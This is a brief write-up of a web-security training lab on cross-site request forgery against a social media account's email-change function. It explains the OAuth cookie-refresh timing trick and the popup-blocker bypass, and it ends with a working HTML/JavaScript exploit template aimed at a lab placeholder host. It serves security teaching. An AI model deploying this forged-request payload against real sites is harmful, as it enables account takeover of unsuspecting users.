*This information is only for the purposes of education and skills development. GET and POST are not acronyms.*

**Target:** Social media user account.

**Request being forged:** Email change request

**Cross Site because:** Forged request for unintended email change comes from exploit server, not the social media website.

**Point of entry**
- OAuth protocol is used for authenticating username and password, as well as email change. 
- A new session cookie is set every time OAuth is triggered, which happens after two minutes since login. 
- The exploit relies on forcing a cookie refresh by sending user to ../social-login page within the two minute window.

**Barrier to entry** 
- New session cookie set within 2 minutes from login, after which the email change exploit does not work. 
- Exploit failure is due to the use of Javascript command `window.open`. This command is for new window/tab, in other words a *pop up*. 
- As `window.open` is automatically blocked by the browser's pop up blocker, the exploit fails.

**Bypassing barrier to entry**
A relevant action from user that triggers the exploit instead of an automated pop up is required. This relevant action can be a click. 

**Template code**
`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@portswigger.net"> </form> <p>Click anywhere on the page</p> <script> window.onclick = () => { window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); } function changeEmail() { document.forms[0].submit(); } </script>`
